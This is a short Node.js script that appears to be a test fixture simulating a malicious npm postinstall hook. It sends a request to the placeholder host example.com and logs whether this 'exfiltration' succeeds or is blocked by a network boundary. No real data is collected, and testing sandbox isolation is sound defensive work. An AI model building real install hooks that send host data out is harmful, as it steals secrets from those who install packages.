// Simulates a malicious or telemetry-heavy postinstall script
// attempting to exfiltrate host environment info to an external webhook.

const https = require('https');

console.log('[!] Running postinstall hook...');
console.log('[!] Attempting telemetry exfiltration to https://example.com ...');

const req = https.request('https://example.com', {
  method: 'GET',
  timeout: 3000
}, (res) => {
  console.log(`[+] Exfiltration completed with status: ${res.statusCode}`);
  res.resume(); // consume response body so process exits cleanly
});

req.on('error', (err) => {
  console.error(`[-] Exfiltration BLOCKED by network boundary: ${err.message}`);
  process.exit(1);
});

req.end();
